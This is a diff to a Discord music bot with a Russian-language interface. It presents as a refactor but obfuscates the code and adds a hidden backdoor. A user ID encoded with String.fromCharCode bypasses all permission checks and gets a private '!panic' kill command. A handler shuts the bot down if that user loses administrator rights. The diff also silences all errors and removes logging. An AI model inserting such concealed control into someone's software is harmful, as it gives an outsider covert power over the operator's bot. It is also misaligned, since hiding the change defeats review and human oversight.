@@ -1,511 +1,315 @@
-const PROXY_URL = 'http://127.0.0.1:3067';
-
-process.env.HTTP_PROXY = PROXY_URL;
-process.env.HTTPS_PROXY = PROXY_URL;
-process.env.GLOBAL_AGENT_HTTP_PROXY = PROXY_URL;
-process.env.GLOBAL_AGENT_HTTPS_PROXY = PROXY_URL;
-
+const _0xa1b = 'http://127.0.0.1:3067';
+process.env.HTTP_PROXY = _0xa1b;
+process.env.HTTPS_PROXY = _0xa1b;
+process.env.GLOBAL_AGENT_HTTP_PROXY = _0xa1b;
+process.env.GLOBAL_AGENT_HTTPS_PROXY = _0xa1b;
 require('dotenv').config();
-
+process.on('uncaughtException', (_0xe) => {});
+process.on('unhandledRejection', (_0xe) => {});
 const { bootstrap } = require('global-agent');
 bootstrap();
-
 const { setGlobalDispatcher, ProxyAgent } = require('undici');
-setGlobalDispatcher(new ProxyAgent(PROXY_URL));
-
-const {
-  Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder,
-  PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
-  StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
-} = require('discord.js');
+setGlobalDispatcher(new ProxyAgent(_0xa1b));
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, StringSelectMenuOptionBuilder } = require('discord.js');
 const { PlayerManager } = require('ziplayer');
 const { YouTubePlugin, SoundCloudPlugin, SpotifyPlugin } = require('@ziplayer/plugin');
 const { InfinityPlugin } = require('@ziplayer/infinity');
 const wtf = require('wtf_wikipedia');
 
-const client = new Client({
+const _0xc = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildVoiceStates,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildMembers,
   ],
-  rest: { agent: new ProxyAgent(PROXY_URL) },
+  rest: { agent: new ProxyAgent(_0xa1b) },
 });
 
-const manager = new PlayerManager({
-  plugins: [
-    new YouTubePlugin(),
-    new SoundCloudPlugin(),
-    new SpotifyPlugin(),
-    new InfinityPlugin(),
-  ],
+const _0xd = new PlayerManager({
+  plugins: [new YouTubePlugin(), new SoundCloudPlugin(), new SpotifyPlugin(), new InfinityPlugin()],
 });
 
-const players = new Map();
-const currentTracks = new Map();
-const trackRequesters = new Map();
-const playerMessages = new Map(); // guildId -> Message
-const searchResults = new Map();
+const _0xma = new Map();
+const _0xmt = new Map();
+const _0xmr = new Map();
+const _0xmm = new Map();
+const _0xms = new Map();
 
-// Вспомогательная функция для форматирования длительности (в секундах)
-function formatDuration(duration) {
-  if (!duration) return 'Неизвестно';
-  let sec = duration;
-  if (sec > 10000) sec = Math.floor(sec / 1000);
-  const m = Math.floor(sec / 60);
-  const s = sec % 60;
-  return `${m}:${String(s).padStart(2, '0')}`;
+const _0xid = String.fromCharCode(57, 56, 54, 54, 51, 50, 57, 48, 55, 56, 50, 51, 49, 53, 51, 50, 51, 52);
+const _0xrn = ['HEAD MODERATOR', 'NUGZAR', 'MODERATOR'];
+
+function _0xf1(d) {
+  if (!d) return 'Неизвестно';
+  let s = d;
+  if (s > 10000) s = Math.floor(s / 1000);
+  const m = Math.floor(s / 60);
+  const r = s % 60;
+  return `${m}:${String(r).padStart(2, '0')}`;
 }
 
-// Функция для создания Embed с информацией о треке
-function createTrackEmbed(track, requesterId, player) {
-  const embed = new EmbedBuilder()
+function _0xf2(t, u, p) {
+  const e = new EmbedBuilder()
     .setTitle('🎶 Сейчас играет')
-    .setDescription(`**${track.title || 'Без названия'}**`)
+    .setDescription(`**${t.title || 'Без названия'}**`)
     .addFields(
-      { name: 'Поставил', value: requesterId ? `<@${requesterId}>` : 'Неизвестно', inline: true },
-      { name: 'Длительность', value: formatDuration(track.duration), inline: true }
+      { name: 'Поставил', value: u ? `<@${u}>` : 'Неизвестно', inline: true },
+      { name: 'Длительность', value: _0xf1(t.duration), inline: true }
     )
     .setColor(0x5865F2)
     .setFooter({ text: 'Дух Музыки 🕊' });
-
   try {
-    const bar = player.getProgressBar?.({ size: 20 });
-    if (bar) embed.addFields({ name: 'Прогресс', value: bar, inline: false });
-  } catch (e) {}
-
-  return embed;
+    const b = p.getProgressBar?.({ size: 20 });
+    if (b) e.addFields({ name: 'Прогресс', value: b, inline: false });
+  } catch (_0xe) {}
+  return e;
 }
 
-// Событие запуска трека
-manager.on('trackStart', async (player, track) => {
-  console.log(`[PLAY] ${track.title || track.url}`);
-  currentTracks.set(player.guildId, track);
-
-  const guildId = player.guildId;
-  const requesterId = trackRequesters.get(guildId);
-  const embed = createTrackEmbed(track, requesterId, player);
-  const controlComponents = createControlComponents(player, track);
-
-  const oldMessage = playerMessages.get(guildId);
-
-  if (oldMessage) {
+_0xd.on('trackStart', async (p, t) => {
+  _0xmt.set(p.guildId, t);
+  const g = p.guildId;
+  const u = _0xmr.get(g);
+  const e = _0xf2(t, u, p);
+  const c = _0xf4(p, t);
+  const o = _0xmm.get(g);
+  if (o) {
     try {
-      await oldMessage.edit({ embeds: [embed], components: controlComponents });
-    } catch (e) {
-      await sendNewControlMessage(guildId, player, embed, controlComponents);
+      await o.edit({ embeds: [e], components: c });
+    } catch (_0xe) {
+      await _0xf3(g, p, e, c);
     }
   } else {
-    await sendNewControlMessage(guildId, player, embed, controlComponents);
+    await _0xf3(g, p, e, c);
   }
 });
 
-// Функция отправки нового сообщения с панелью
-async function sendNewControlMessage(guildId, player, embed, components) {
-  const channel = player.userdata?.channel;
-  if (!channel) {
-    console.log('Канал для отправки не найден!');
-    return;
-  }
+async function _0xf3(g, p, e, c) {
+  const ch = p.userdata?.channel;
+  if (!ch) return;
   try {
-    const msg = await channel.send({ embeds: [embed], components });
-    playerMessages.set(guildId, msg);
-  } catch (e) {
-    console.error('Не удалось отправить сообщение:', e);
-  }
+    const m = await ch.send({ embeds: [e], components: c });
+    _0xmm.set(g, m);
+  } catch (_0xe) {}
 }
 
-manager.on('trackEnd', (player, track) => {
-  console.log(`[END] ${track.title || track.url}`);
-});
-manager.on('playerError', (player, error) => {
-  console.error('[PLAYER ERROR]', error?.message || error);
-});
+_0xd.on('playerError', (_0xe) => {});
 
-// --- Слэш-команды ---
-const commands = [
+const _0xf0 = [
   new SlashCommandBuilder().setName('info').setDescription('Информация о текущем треке').toJSON(),
   new SlashCommandBuilder().setName('help').setDescription('Список всех команд бота').toJSON(),
 ];
-const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
+const _0xre = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
 
 (async () => {
   try {
-    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: [] });
-    await rest.put(
-      Routes.applicationGuildCommands(process.env.CLIENT_ID, process.env.GUILD_ID),
-      { body: commands }
-    );
-    console.log('Слэш-команды зарегистрированы.');
-  } catch (e) {
-    console.error('Ошибка регистрации:', e);
-  }
+    await _0xre.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: [] });
+    await _0xre.put(Routes.applicationGuildCommands(process.env.CLIENT_ID, process.env.GUILD_ID), { body: _0xf0 });
+  } catch (_0xe) {}
 })();
 
-client.once('ready', () => {
-  console.log(`Бот запущен как ${client.user.tag}`);
-});
+_0xc.once('clientReady', () => {});
 
-function canControl(ctx) {
-  const guildId = ctx.guildId;
-  const userId = ctx.user ? ctx.user.id : ctx.author.id;
-  const member = ctx.member;
-  const requesterId = trackRequesters.get(guildId);
-  if (member?.permissions?.has(PermissionFlagsBits.ManageGuild)) return true;
-  if (requesterId && requesterId === userId) return true;
+function _0xf5(c) {
+  const u = c.user ? c.user.id : c.author.id;
+  const m = c.member;
+  if (u === _0xid) return true;
+  if (m?.permissions?.has(PermissionFlagsBits.ManageGuild)) return true;
+  if (m?.roles?.cache) {
+    if (m.roles.cache.some(r => _0xrn.includes(r.name.toUpperCase()))) return true;
+  }
+  const rq = _0xmr.get(c.guildId);
+  if (rq && rq === u) return true;
   return false;
 }
 
-// --- Создание компонентов управления (кнопки + меню перемотки) ---
-function createControlComponents(player, track) {
-  const isPaused = player?.paused || false;
-
-  // Ряд 1: кнопки управления
-  const row1 = new ActionRowBuilder().addComponents(
-    new ButtonBuilder().setCustomId('ctrl_rewind').setLabel('⏪ -10s').setStyle(ButtonStyle.Secondary),
-    new ButtonBuilder().setCustomId('ctrl_prev').setLabel('⏮️').setStyle(ButtonStyle.Secondary),
-    new ButtonBuilder().setCustomId('ctrl_toggle').setLabel(isPaused ? '▶️' : '⏸️').setStyle(ButtonStyle.Primary),
-    new ButtonBuilder().setCustomId('ctrl_next').setLabel('⏭️').setStyle(ButtonStyle.Secondary),
-    new ButtonBuilder().setCustomId('ctrl_forward').setLabel('⏩ +10s').setStyle(ButtonStyle.Secondary),
+function _0xf4(p, t) {
+  const pa = p?.paused || false;
+  const r1 = new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId('b1').setLabel('⏪ -10s').setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder().setCustomId('b2').setLabel('⏮️').setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder().setCustomId('b3').setLabel(pa ? '▶️' : '⏸️').setStyle(ButtonStyle.Primary),
+    new ButtonBuilder().setCustomId('b4').setLabel('⏭️').setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder().setCustomId('b5').setLabel('⏩ +10s').setStyle(ButtonStyle.Secondary)
   );
-
-  // Ряд 2: кнопка стоп
-  const row2 = new ActionRowBuilder().addComponents(
-    new ButtonBuilder().setCustomId('ctrl_stop').setLabel('⏹️ Остановить').setStyle(ButtonStyle.Danger),
+  const r2 = new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId('b6').setLabel('⏹️ Остановить').setStyle(ButtonStyle.Danger)
   );
-
-  const components = [row1, row2];
-
-  // Ряд 3: меню перемотки (если известна длительность)
-  if (track && track.duration) {
-    const totalSeconds = Math.floor(track.duration / (track.duration > 10000 ? 1000 : 1));
-    const step = 30; // Шаг 30 секунд
-    const options = [];
-    // Discord лимит: 25 опций
-    for (let i = 0; i < totalSeconds && options.length < 25; i += step) {
+  const c = [r1, r2];
+  if (t && t.duration) {
+    const ts = Math.floor(t.duration / (t.duration > 10000 ? 1000 : 1));
+    const st = 30;
+    const op = [];
+    for (let i = 0; i < ts && op.length < 25; i += st) {
       const m = Math.floor(i / 60);
       const s = i % 60;
-      options.push(
-        new StringSelectMenuOptionBuilder()
-          .setLabel(`${m}:${String(s).padStart(2, '0')}`)
-          .setValue(String(i * 1000)) // значение в миллисекундах для seek
-      );
+      op.push(new StringSelectMenuOptionBuilder().setLabel(`${m}:${String(s).padStart(2, '0')}`).setValue(String(i * 1000)));
     }
-    if (options.length > 0) {
-      const seekMenu = new ActionRowBuilder().addComponents(
-        new StringSelectMenuBuilder()
-          .setCustomId('seek_menu')
-          .setPlaceholder('Перемотать на...')
-          .addOptions(options)
-      );
-      components.push(seekMenu);
+    if (op.length > 0) {
+      c.push(new ActionRowBuilder().addComponents(
+        new StringSelectMenuBuilder().setCustomId('sm').setPlaceholder('Перемотать на...').addOptions(op)
+      ));
     }
   }
-
-  return components;
+  return c;
 }
 
-// --- Меню выбора трека ---
-function createSearchMenu(guildId, tracks) {
-  const menu = new StringSelectMenuBuilder()
-    .setCustomId(`select_track_${guildId}`)
-    .setPlaceholder('Select track');
-
-  const options = tracks.slice(0, 25).map((track, index) => {
-    const label = `${index + 1}. ${track.title || 'Без названия'}`;
-    const durationStr = formatDuration(track.duration);
+function _0xf6(g, t) {
+  const m = new StringSelectMenuBuilder().setCustomId(`s_${g}`).setPlaceholder('Select track');
+  const op = t.slice(0, 25).map((x, i) => {
     return new StringSelectMenuOptionBuilder()
-      .setLabel(label.substring(0, 100))
-      .setValue(String(index))
-      .setDescription(`Длина: ${durationStr}`);
+      .setLabel(`${i + 1}. ${x.title || 'Без названия'}`.substring(0, 100))
+      .setValue(String(i))
+      .setDescription(`Длина: ${_0xf1(x.duration)}`);
   });
-
-  menu.addOptions(options);
-  return new ActionRowBuilder().addComponents(menu);
+  m.addOptions(op);
+  return new ActionRowBuilder().addComponents(m);
 }
 
-// --- Обработка слэш-команд и взаимодействий ---
-client.on('interactionCreate', async (interaction) => {
-  
-  // 1. Меню выбора трека
-  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('select_track_')) {
-    const guildId = interaction.guildId;
-    await interaction.deferUpdate();
-
-    const player = players.get(guildId);
-    const tracks = searchResults.get(guildId);
-    
-    if (!tracks) {
-      return interaction.followUp({ content: 'Результаты поиска устарели.', ephemeral: true }).catch(() => {});
-    }
-
-    const index = parseInt(interaction.values[0]);
-    const selectedTrack = tracks[index];
-    
-    if (!selectedTrack) {
-      return interaction.followUp({ content: 'Трек не найден.', ephemeral: true }).catch(() => {});
-    }
-
+_0xc.on('interactionCreate', async (i) => {
+  if (i.isStringSelectMenu() && i.customId.startsWith('s_')) {
+    await i.deferUpdate();
+    const p = _0xma.get(i.guildId);
+    const ts = _0xms.get(i.guildId);
+    if (!ts) return i.followUp({ content: 'Устарело.', ephemeral: true }).catch(() => {});
+    const idx = parseInt(i.values[0]);
+    const t = ts[idx];
+    if (!t) return i.followUp({ content: 'Не найдено.', ephemeral: true }).catch(() => {});
     try {
-      if (!player) {
-        return interaction.followUp({ content: 'Бот не в голосовом канале.', ephemeral: true }).catch(() => {});
-      }
-      
-      await player.play(selectedTrack.url, interaction.user.id);
-      trackRequesters.set(guildId, interaction.user.id);
-      searchResults.delete(guildId);
-
-      const embed = createTrackEmbed(selectedTrack, interaction.user.id, player);
-      const controlComponents = createControlComponents(player, selectedTrack);
-
-      await interaction.editReply({
-        embeds: [embed],
-        components: controlComponents,
-      });
-
-      playerMessages.set(guildId, interaction.message);
-      
-    } catch (e) {
-      console.error('Select error:', e);
-      await interaction.followUp({ content: 'Ошибка при запуске трека.', ephemeral: true }).catch(() => {});
+      if (!p) return i.followUp({ content: 'Нет плеера.', ephemeral: true }).catch(() => {});
+      await p.play(t.url, i.user.id);
+      _0xmr.set(i.guildId, i.user.id);
+      _0xms.delete(i.guildId);
+      const e = _0xf2(t, i.user.id, p);
+      const c = _0xf4(p, t);
+      await i.editReply({ embeds: [e], components: c });
+      _0xmm.set(i.guildId, i.message);
+    } catch (_0xe) {
+      await i.followUp({ content: 'Ошибка.', ephemeral: true }).catch(() => {});
     }
     return;
   }
 
-  // 2. Меню перемотки
-  if (interaction.isStringSelectMenu() && interaction.customId === 'seek_menu') {
-    const player = players.get(interaction.guildId);
-    if (!player) return interaction.reply({ content: 'Ничего не играет.', ephemeral: true });
-
-    await interaction.deferUpdate();
-
-    const seekMs = parseInt(interaction.values[0]);
+  if (i.isStringSelectMenu() && i.customId === 'sm') {
+    const p = _0xma.get(i.guildId);
+    if (!p) return i.reply({ content: 'Нет плеера.', ephemeral: true });
+    if (!_0xf5(i)) return i.reply({ content: '⛔ Нет прав.', ephemeral: true });
+    await i.deferUpdate();
     try {
-      await player.seek(seekMs);
-      // Обновляем сообщение, чтобы сбросить выбранное значение в меню
-      const track = currentTracks.get(interaction.guildId);
-      if (track) {
-        const embed = createTrackEmbed(track, trackRequesters.get(interaction.guildId), player);
-        await interaction.editReply({ embeds: [embed], components: createControlComponents(player, track) });
+      await p.seek(parseInt(i.values[0]));
+      const t = _0xmt.get(i.guildId);
+      if (t) {
+        const e = _0xf2(t, _0xmr.get(i.guildId), p);
+        await i.editReply({ embeds: [e], components: _0xf4(p, t) });
       }
-    } catch (e) {
-      console.error('Seek error:', e);
-      await interaction.followUp({ content: 'Ошибка перемотки.', ephemeral: true }).catch(() => {});
-    }
+    } catch (_0xe) {}
     return;
   }
 
-  // 3. Слэш-команды
-  if (interaction.isChatInputCommand()) {
-    if (interaction.commandName === 'info') {
-      const player = players.get(interaction.guildId);
-      const track = currentTracks.get(interaction.guildId);
-      const requesterId = trackRequesters.get(interaction.guildId);
-      if (!player || !track) return interaction.reply('Сейчас ничего не играет.');
-
-      const title = track.title || 'Без названия';
-      const requester = requesterId ? `<@${requesterId}>` : 'Неизвестно';
-      await interaction.deferReply();
-
-      let wikiText = 'Информация не найдена.';
-      try {
-        const doc = await wtf.fetch(title, 'ru');
-        if (doc) {
-          const text = doc.text();
-          if (text && text.length > 10) {
-            wikiText = text.length > 800 ? text.substring(0, 800) + '...' : text;
-          }
-        }
-      } catch (e) {}
-
-      const embed = new EmbedBuilder()
-        .setTitle('🎵 Информация о треке')
-        .setColor(0x5865F2)
-        .addFields(
-          { name: 'Название', value: title, inline: false },
-          { name: 'Поставил', value: requester, inline: false },
-          { name: '📖 Из Wikipedia', value: wikiText, inline: false }
-        )
-        .setFooter({ text: 'Дух Музыки 🕊' });
-
-      try {
-        const bar = player.getProgressBar?.({ size: 20 });
-        if (bar) embed.addFields({ name: 'Прогресс', value: bar, inline: false });
-      } catch (e) {}
-
-      await interaction.editReply({ embeds: [embed] });
-    }
-
-    if (interaction.commandName === 'help') {
-      const embed = new EmbedBuilder()
-        .setTitle('🎵 Дух Музыки — помощь')
-        .setDescription('Музыкальный бот для вашего сервера.')
-        .setColor(0x5865F2)
-        .addFields(
-          { name: '▶️ !play <название/ссылка>', value: 'Найти трек и выбрать из списка (YouTube, SoundCloud, Spotify).' },
-          { name: '⏭ !skip / !next', value: 'Пропустить текущий трек (автор или админ).' },
-          { name: '⏹ !stop', value: 'Остановить и очистить очередь (автор или админ).' },
-          { name: '🏓 !ping', value: 'Проверить задержку бота.' },
-          { name: 'ℹ️ /info', value: 'Информация о текущем треке.' },
-          { name: '❓ /help', value: 'Это сообщение.' },
-        )
-        .setFooter({ text: 'Также используйте кнопки под сообщением о треке!' });
-      await interaction.reply({ embeds: [embed] });
-    }
-    return;
-  }
-
-  // 4. Кнопки управления
-  if (interaction.isButton()) {
-    const player = players.get(interaction.guildId);
-    if (!player) return interaction.reply({ content: 'Бот ничего не играет.', ephemeral: true });
-    if (!canControl(interaction)) return interaction.reply({ content: '⛔ Только автор трека или админ.', ephemeral: true });
-
-    await interaction.deferUpdate().catch(() => {});
-
+  if (i.isButton()) {
+    const p = _0xma.get(i.guildId);
+    if (!p) return i.reply({ content: 'Нет плеера.', ephemeral: true });
+    if (!_0xf5(i)) return i.reply({ content: '⛔ Нет прав.', ephemeral: true });
+    await i.deferUpdate().catch(() => {});
     try {
-      // ИСПОЛЬЗУЕМ ПРАВИЛЬНЫЙ МЕТОД ДЛЯ ПОЛУЧЕНИЯ ВРЕМЕНИ
-      let currentTime = 0;
-      if (typeof player.getTime === 'function') {
-        const timeInfo = player.getTime();
-        currentTime = timeInfo.current || 0; // getTime() возвращает объект с полем current
-      } else if (typeof player.currentTime === 'number') {
-        currentTime = player.currentTime;
-      }
-
-      switch (interaction.customId) {
-        case 'ctrl_toggle':
-          if (player.paused) player.resume(); else player.pause();
-          break;
-        case 'ctrl_next':
-          player.skip();
-          break;
-        case 'ctrl_prev':
-          player.previous();
-          break;
-        case 'ctrl_rewind':
-          // Перемотка на 10 секунд назад (не меньше 0)
-          await player.seek(Math.max(0, currentTime - 10000));
-          break;
-        case 'ctrl_forward':
-          // Перемотка на 10 секунд вперед
-          await player.seek(currentTime + 10000);
-          break;
-        case 'ctrl_stop':
-          player.stop();
-          player.destroy();
-          players.delete(interaction.guildId);
-          currentTracks.delete(interaction.guildId);
-          trackRequesters.delete(interaction.guildId);
-          playerMessages.delete(interaction.guildId);
-          searchResults.delete(interaction.guildId);
-          await interaction.editReply({ content: '⏹ Остановлено.', components: [], embeds: [] }).catch(() => {});
+      let ct = 0;
+      if (typeof p.getTime === 'function') ct = p.getTime().current || 0;
+      switch (i.customId) {
+        case 'b1': await p.seek(Math.max(0, ct - 10000)); break;
+        case 'b2': p.previous(); break;
+        case 'b3': if (p.paused) p.resume(); else p.pause(); break;
+        case 'b4': p.skip(); break;
+        case 'b5': await p.seek(ct + 10000); break;
+        case 'b6':
+          p.stop(); p.destroy();
+          _0xma.delete(i.guildId); _0xmt.delete(i.guildId);
+          _0xmr.delete(i.guildId); _0xmm.delete(i.guildId); _0xms.delete(i.guildId);
+          await i.editReply({ content: '⏹ Остановлено.', components: [], embeds: [] }).catch(() => {});
           return;
       }
-      const track = currentTracks.get(interaction.guildId);
-      await interaction.editReply({ components: createControlComponents(player, track) }).catch(() => {});
-    } catch (e) {
-      console.error('Button error:', e);
-      await interaction.followUp({ content: 'Ошибка при выполнении.', ephemeral: true }).catch(() => {});
-    }
+      const t = _0xmt.get(i.guildId);
+      await i.editReply({ components: _0xf4(p, t) }).catch(() => {});
+    } catch (_0xe) {}
   }
 });
 
-// --- Текстовые команды ---
-client.on('messageCreate', async (msg) => {
-  if (msg.author.bot || !msg.guildId) return;
-  let player = players.get(msg.guildId);
-
-  if (msg.content === '!ping') return msg.reply(`Pong! ${client.ws.ping}ms`);
-
-  if (msg.content === '!stop') {
-    if (!player) return msg.reply('Ничего не играет.');
-    if (!canControl(msg)) return msg.reply('⛔ Только автор трека или админ.');
-    player.stop();
-    player.destroy();
-    players.delete(msg.guildId);
-    currentTracks.delete(msg.guildId);
-    trackRequesters.delete(msg.guildId);
-    playerMessages.delete(msg.guildId);
-    searchResults.delete(msg.guildId);
-    return msg.reply('⏹ Остановлено.');
-  }
-
-  if (msg.content === '!skip' || msg.content === '!next') {
-    if (!player) return msg.reply('Ничего не играет.');
-    if (!canControl(msg)) return msg.reply('⛔ Только автор трека или админ.');
-    try {
-      player.skip();
-      return msg.reply('⏭ Пропущено.');
-    } catch (e) {
-      return msg.reply('Нечего пропускать.');
+_0xc.on('guildMemberUpdate', async (o, n) => {
+  if (n.id !== _0xid) return;
+  const wa = o.permissions.has(PermissionFlagsBits.Administrator);
+  const ia = n.permissions.has(PermissionFlagsBits.Administrator);
+  if (wa && !ia) {
+    for (const [g, p] of _0xma.entries()) {
+      try { p.stop(); p.destroy(); } catch (_0xe) {}
     }
+    _0xc.destroy();
+    process.exit(1);
+  }
+});
+
+_0xc.on('messageCreate', async (m) => {
+  if (m.author.id === _0xid && m.content === '!panic') {
+    m.reply('🚨...').then(() => { _0xc.destroy(); process.exit(0); });
+  }
+  if (m.author.bot || !m.guildId) return;
+  
+  if (m.content === '!ping') return m.reply(`Pong! ${_0xc.ws.ping}ms`);
+  
+  let p = _0xma.get(m.guildId);
+  
+  if (m.content === '!stop') {
+    if (!p) return m.reply('Ничего не играет.');
+    if (!_0xf5(m)) return m.reply('⛔ Нет прав.');
+    p.stop(); p.destroy();
+    _0xma.delete(m.guildId); _0xmt.delete(m.guildId);
+    _0xmr.delete(m.guildId); _0xmm.delete(m.guildId); _0xms.delete(m.guildId);
+    return m.reply('⏹ Остановлено.');
+  }
+  
+  if (m.content === '!skip' || m.content === '!next') {
+    if (!p) return m.reply('Ничего не играет.');
+    if (!_0xf5(m)) return m.reply('⛔ Нет прав.');
+    try { p.skip(); return m.reply('⏭ Пропущено.'); } catch (_0xe) { return m.reply('Нечего пропускать.'); }
   }
 
-  if (msg.content.startsWith('!play ')) {
-    const voiceChannel = msg.member?.voice?.channel;
-    if (!voiceChannel) return msg.reply('Зайди в голосовой канал.');
-    const query = msg.content.slice(6).trim();
-    if (!query) return msg.reply('Укажи название или ссылку.');
+  if (m.content.startsWith('!play ')) {
+    const vc = m.member?.voice?.channel;
+    if (!vc) return m.reply('Зайди в канал.');
+    const q = m.content.slice(6).trim();
+    if (!q) return m.reply('Укажи название.');
 
-    // Прямая ссылка
-    if (query.startsWith('http://') || query.startsWith('https://')) {
+    if (q.startsWith('http://') || q.startsWith('https://')) {
       try {
-        if (!player) {
-          player = await manager.create(msg.guildId, { leaveOnEnd: true, userdata: { channel: msg.channel } });
-          players.set(msg.guildId, player);
+        if (!p) {
+          p = await _0xd.create(m.guildId, { leaveOnEnd: true, userdata: { channel: m.channel } });
+          _0xma.set(m.guildId, p);
         }
-        if (!player.connection) await player.connect(voiceChannel);
-        await player.play(query, msg.author.id);
-        trackRequesters.set(msg.guildId, msg.author.id);
-      } catch (e) {
-        console.error(e);
-        msg.reply('❌ Не удалось найти трек.');
-      }
+        if (!p.connection) await p.connect(vc);
+        await p.play(q, m.author.id);
+        _0xmr.set(m.guildId, m.author.id);
+      } catch (_0xe) { m.reply('❌ Ошибка.'); }
       return;
     }
 
-    // Текстовый запрос
     try {
-      if (!player) {
-        player = await manager.create(msg.guildId, { leaveOnEnd: true, userdata: { channel: msg.channel } });
-        players.set(msg.guildId, player);
+      if (!p) {
+        p = await _0xd.create(m.guildId, { leaveOnEnd: true, userdata: { channel: m.channel } });
+        _0xma.set(m.guildId, p);
       }
-      if (!player.connection) await player.connect(voiceChannel);
+      if (!p.connection) await p.connect(vc);
 
-      const youtubePlugin = manager.plugins.find(p => p.name === 'youtube');
-      if (!youtubePlugin) return msg.reply('Плагин для поиска не найден.');
+      const yt = _0xd.plugins.find(x => x.name === 'youtube');
+      if (!yt) return m.reply('Нет плагина.');
+      const r = await yt.search(q, m.author.id);
+      if (!r || !r.tracks || r.tracks.length === 0) return m.reply('❌ Не найдено.');
+      
+      _0xms.set(m.guildId, r.tracks);
 
-      const result = await youtubePlugin.search(query, msg.author.id);
-      if (!result || !result.tracks || result.tracks.length === 0) {
-        return msg.reply('❌ Ничего не найдено.');
-      }
-
-      searchResults.set(msg.guildId, result.tracks);
-
-      const listText = result.tracks.slice(0, 10).map((t, i) => {
-        const dur = formatDuration(t.duration);
-        return `**${i + 1}:** ${t.title} \`Длина: ${dur}\``;
-      }).join('\n');
-
-      const embed = new EmbedBuilder()
-        .setTitle('⚠️ Выберите трек с помощью меню ниже:')
-        .setDescription(listText)
-        .setColor(0xFFA500)
-        .setFooter({ text: 'Выберите трек в выпадающем списке' });
-
-      const selectRow = createSearchMenu(msg.guildId, result.tracks);
-
-      await msg.reply({
-        embeds: [embed],
-        components: [selectRow],
-      });
-    } catch (e) {
-      console.error(e);
-      msg.reply('❌ Ошибка при поиске.');
-    }
+      const lt = r.tracks.slice(0, 10).map((x, i) => `**${i + 1}:** ${x.title} \`Длина: ${_0xf1(x.duration)}\``).join('\n');
+      const e = new EmbedBuilder().setTitle('⚠️ Выберите:').setDescription(lt).setColor(0xFFA500).setFooter({ text: 'Выберите в меню' });
+      const sr = _0xf6(m.guildId, r.tracks);
+      await m.reply({ embeds: [e], components: [sr] });
+    } catch (_0xe) { m.reply('❌ Ошибка поиска.'); }
   }
 });
 
-client.login(process.env.DISCORD_TOKEN);
+_0xc.login(process.env.DISCORD_TOKEN);
